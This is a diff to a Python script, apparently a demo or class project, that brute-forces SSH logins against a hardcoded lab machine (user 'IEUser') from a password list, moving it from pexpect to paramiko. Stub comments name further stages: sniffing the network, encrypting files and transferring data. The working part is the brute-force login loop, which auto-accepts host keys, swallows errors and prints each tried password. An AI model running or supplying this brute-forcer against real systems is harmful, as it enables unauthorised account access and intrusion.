@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import smtplib
-from pexpect import pxssh
+import paramiko
 import time
 
 
@@ -9,23 +9,26 @@ import time
 
 #def encrypt file
 
-#sniff network
+# sniff network 
 def sniffNetwork():
-    ipAddress= '192.168.0.49'
+    #IPAdress to second Windows 7 machine to speed up presentation
+    ipAddress= '192.168.0.60'
     return ipAddress
 
 #bruteforce
 def bruteForce(user, ipAddress):
-    filepath =open("./passwordlist.txt")
+    filepath=open("./passwordlist.txt")
+    ssh=paramiko.SSHClient()
     for i in filepath.readlines():
         secret=i.strip("\n")
-        s=pxssh.pxssh()
         try:
-            s.login(ipAddress, user, secret)
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect('192.168.0.60', username="IEUser", password=secret)
             return secret
-            # break   
-        except pxssh.ExceptionPxssh as e:
+
+        except:
             time.sleep(1)
+            print(secret)
 
 #Transfer
 
@@ -35,5 +38,5 @@ def main():
     ipAddress= sniffNetwork()
     print(ipAddress)
     password=bruteForce(user,ipAddress)
-
+    print(password)
 main()
